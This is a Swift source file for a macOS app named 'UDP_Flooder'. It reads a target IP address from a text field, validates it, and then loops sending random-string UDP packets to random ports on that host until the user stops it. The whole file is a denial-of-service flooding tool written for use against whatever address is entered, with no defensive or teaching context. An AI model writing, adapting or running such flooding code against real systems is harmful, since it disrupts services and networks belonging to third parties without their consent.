//
//  ViewController.swift
//  UDP_Flooder
//
//  Created by BinaryBoy on 5/15/17.
//  Copyright © 2017 BinaryBoy. All rights reserved.
//

import Cocoa
import SwiftSocket
class ViewController: NSViewController {
    
    @IBOutlet var targetTextField: NSTextField!
    var start:Bool = false
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.

    }
    @IBAction func Flood(_ sender: NSButton) {
        if isValidIP(testStr: targetTextField.stringValue){
            start = !start
            while start {
                sender.title = "Stop Flood"
                
                let client: UDPClient = UDPClient(address: targetTextField.stringValue, port: Int32(Random.getRandomPort()))
                
                DispatchQueue.global().async {
                    //            client.port = Int32(Random.getRandomPort())
                    let payload = Random.randomString()
                    print(payload)
                    _ = client.send(string: payload)
                    
                }
            }
        }
    }
    
    override var representedObject: Any? {
        didSet {
            // Update the view, if already loaded.
        }
    }
    
    func isValidIP(testStr:String) -> Bool {
        // print("validate calendar: \(testStr)")
        let validIpAddressRegex = "^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
        
        let emailTest = NSPredicate(format:"SELF MATCHES %@", validIpAddressRegex)
        return emailTest.evaluate(with: testStr)
    }}

